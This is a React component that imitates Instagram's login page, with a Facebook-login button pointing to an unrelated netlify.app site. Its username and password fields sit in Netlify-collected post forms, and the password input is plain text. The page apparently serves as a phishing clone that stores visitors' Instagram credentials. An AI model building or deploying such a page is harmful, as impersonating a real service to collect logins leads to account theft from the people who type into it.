import react from "react";
import './Upper.css';
import Logo from "./logo fb.png"

const  Upper = () => {
    return(
        <div id ='upperbox'>
              
              <div id="eng">
                  English       ^
              </div>
              <h1 id ='insta'>
                  Instagram
              </h1>
            <a href="https://nostalgic-lumiere-91bbce.netlify.app/">
              <button id="fbloginb"> <img id="logo" width="17px" height="17px" src = {Logo}></img>    Continue with Facebook</button>
            </a>
              <div id="or">
                 ------------------------   OR   ------------------------
             </div>


              <div id='username'>
               <form
                name ="username"
                method ="post"
                data-netlify="true"
                onSubmit="submit"
               >
               <label id ='username2'>
               <input id="usinp" type="text" size={31 } placeholder=" Phone number, username, or email" />
                
                </label>
               </form>
              </div>

              <div id='password'>
               <form
                    name ="password"
                    method ="post"
                    data-netlify="true"
                    onSubmit="submit"
               >
                <label  id ='password2'>
                   <input id="psinp" type="text" size={31} placeholder=" password" />
                </label>
               </form>
              </div>

              <div id="forgotpas">
                 Forgot password?
             </div>

                <button type="submit" id="button">Log In</button> 
            
            <div id="noacct">
                Don't have an account ?  
                <a id="linka" href="https://www.instagram.com/">
                <h3 id="signup">Sign up</h3>
                </a>
            </div>
             
            
            
        </div>
    )
}
export default Upper;